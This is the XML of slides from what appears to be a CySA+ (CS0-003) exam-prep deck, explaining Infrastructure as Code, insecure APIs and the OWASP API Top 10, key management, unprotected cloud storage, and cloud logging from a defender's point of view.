<file path=ppt/slides/slide5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REMOTE SERVICE INVOCATION (FAAS, IAC, API)</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Infrastructure as Code (IaC)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Infrastructure as Code (IaC) is a structured method of defining and provisioning infrastructure through machine-readable configuration files rather than manual setup, using virtualization and automated provisioning to build environments consistently.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It exists because developers tend to configure systems by personal preference, causing environments to diverge (configuration drift) and quietly introduce vulnerabilities; IaC minimizes local configuration differences and makes it easy to create identical, cloned, repeatable environments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst values IaC because a secure, version-controlled template propagates hardening everywhere and can be scanned before deployment, but the same templates are a risk if a flaw or embedded secret is written once and then replicated across every provisioned environment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Tested as the practice that eliminates configuration drift through repeatable templates, where the exam notes both the consistency benefit and the risk of a single flawed template scaling a vulnerability.</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510</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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REMOTE SERVICE INVOCATION (FAAS, IAC, API)</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Infrastructure as Code (IaC)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Developers tend to develop based on personal preferences</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Development environments diverge</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Can introduce vulnerabilities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511</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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REMOTE SERVICE INVOCATION (FAAS, IAC, API)</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Infrastructure as Code (IaC)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Structured method to create stable development environments</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Minimizes local configuration differences</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Virtualization and structured provisioning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Makes it easy to create cloned environments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512</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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INSECURE APPLICATION PROGRAMMING INTERFACE (API)</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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Insecure Application Programming Interface (API)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An Application Programming Interface (API) is the contract that lets applications, services, and clients exchange data and invoke functions programmatically, and an insecure API is one whose design or implementation exposes that contract to abuse.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Poorly written APIs introduce vulnerabilities such as missing authentication or authorization checks, trusting client-supplied input without validation, leaking excessive data in responses, and lacking rate limiting, allowing attackers to enumerate objects, escalate privileges, or exfiltrate data at scale.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because modern web, mobile, cloud, and microservices architectures expose most of their functionality through APIs, the API is often the largest and least-monitored attack surface in an environment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC or security analyst cares because API flaws frequently bypass traditional perimeter controls, are hard to spot in logs, and are a leading root cause of large data breaches, so they must be identified during vulnerability scanning, threat modeling, and secure code review.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: On CS0-003 you may be asked to recognize insecure API characteristics from a scenario or scan result and recommend remediation such as adding authentication, input validation, or rate limiting.</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513</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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INSECURE APPLICATION PROGRAMMING INTERFACE (API)</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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Insecure Application Programming Interface (API)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Poorly written APIs may have vulnerabilities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514</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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INSECURE APPLICATION PROGRAMMING INTERFACE (API)</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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>OWASP API Security Project top ten vulnerabilities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The OWASP API Security Project publishes a Top 10 list of the most critical API-specific risks, giving analysts a standardized framework to prioritize API weaknesses much as the traditional OWASP Top 10 does for web applications.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Its core categories include broken object level authorization (accessing another user's records by changing an ID), broken user authentication, excessive data exposure, lack of resources and rate limiting, broken function level authorization, mass assignment, security misconfiguration, injection, improper asset management (unknown or outdated API endpoints), and insufficient logging and monitoring.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Authorization flaws dominate the list because APIs expose object and function references directly, so a client that manipulates an identifier or endpoint can reach data or actions it was never meant to access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst uses this list to guide API vulnerability assessments, drive secure design requirements, and communicate risk to developers using a shared, industry-recognized vocabulary.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam expects you to map an API attack scenario (for example changing a record ID to view another user's data) to the correct OWASP API risk such as broken object level authorization.</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515</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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INSECURE APPLICATION PROGRAMMING INTERFACE (API)</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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>OWASP API Security Project top ten vulnerabilities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Broken object level authorization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Mass assignment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Broken user authentication</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Excessive data exposure</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Lack of resources and rate limiting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Broken function level authorization</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Security misconfiguration</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Injection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Improper asset management</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Insufficient logging and monitoring</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516</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD VULNERABILITIES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Improper Key Management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Encryption protects confidentiality, integrity, and non-repudiation, but its entire security rests on the secrecy and proper handling of the cryptographic keys rather than on the algorithm itself.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Improper key management is the failure to correctly handle a key across its full lifecycle: secure generation using strong randomness, protected distribution to authorized parties, safe storage away from the data it protects, timely rotation and replacement, and secure revocation or destruction.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Common failures include hardcoding keys in source code or config files, reusing keys indefinitely, transmitting them insecurely, or storing them alongside the ciphertext, any of which lets an attacker decrypt data and render the encryption worthless.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC or security analyst cares because a leaked or mismanaged key nullifies otherwise strong cryptography, so key handling is a frequent finding in vulnerability assessments and a control that must be verified, ideally using hardware security modules or dedicated key management services.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: CS0-003 may present a scenario where encrypted data is compromised and ask you to identify improper key management (such as hardcoded or non-rotated keys) as the root cause.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517</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD VULNERABILITIES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Improper Key Management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Encryption can protect</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Confidentiality</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Integrity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Non-repudiation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Security depends on the encryption key</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Key management is difficult (to do right)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Generation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Distribution</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Replacement</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518</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD VULNERABILITIES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Unprotected Storage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Unprotected storage refers to data repositories, especially cloud storage such as object buckets and blobs, that are left accessible because their security settings were never properly configured.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Cloud storage physically resides on the provider's systems, so under the shared responsibility model the customer's administrators must explicitly restrict access, enable encryption, and disable public reachability rather than assuming the provider secures the contents.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A common loophole is granting broad or public access for convenience, which then exposes sensitive data to anyone who discovers the endpoint, a pattern behind many high-profile breaches of misconfigured buckets.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A security analyst cares because unprotected storage is easy for attackers and researchers to find through simple scanning, so detecting overly permissive access, missing encryption, and public exposure is a core part of cloud vulnerability management.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect a scenario involving a publicly accessible or misconfigured cloud storage bucket where you must identify the exposure and recommend tightening access permissions and enabling encryption.</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519</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD VULNERABILITIES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Unprotected Storage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Cloud storage is located on someone else’s computing systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Be sure to secure the storage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Vulnerabilities can leave storage open to hackers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Admins must configure security settings properly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Common loophole is mass access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Often granted for convenience</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  May expose sensitive data</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520</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD VULNERABILITIES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Logging and Monitoring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Logging captures records of important system, application, and security events, and monitoring is the continuous review of those records to detect anomalies, misuse, and incidents.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  In cloud environments the ability to log is governed by the shared responsibility model: the more of the stack the provider manages (moving from IaaS toward SaaS), the less granular visibility and control the customer retains over what is logged and exposed.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Service Level Agreements and contracts should explicitly spell out which party is responsible for generating, retaining, and providing access to logs, so gaps in visibility are identified before an incident rather than during one.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC or security analyst cares because insufficient logging and monitoring is itself a recognized vulnerability that lets attacks go undetected, and analysts must ensure critical events are captured and forwarded to a SIEM for correlation and alerting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam may test how cloud service models (IaaS, PaaS, SaaS) affect logging visibility and why insufficient logging and monitoring is treated as a vulnerability that delays detection.</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521</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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CLOUD VULNERABILITIES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Logging and Monitoring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Responsibility changes based on cloud service models</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  If service provider is taking on most of the responsibility, user has little control over what gets logged</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Monitor and log all important events</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  More services means less granular control</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SLAs spell out roles and responsibilities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522</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide5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PLATFORMS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Platforms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A platform in this context is the software architecture that defines what functions an application performs and where each of those functions actually executes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
